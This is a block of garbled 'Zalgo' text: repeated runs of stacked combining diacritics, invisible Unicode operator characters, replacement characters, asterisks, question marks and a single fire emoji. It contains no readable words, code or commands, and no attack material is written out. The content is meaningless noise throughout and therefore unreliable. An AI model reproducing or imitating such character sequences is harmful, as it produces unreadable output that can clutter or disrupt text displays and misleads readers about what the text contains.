̡̧͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̊̽͒̿̽͑̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̍̓̒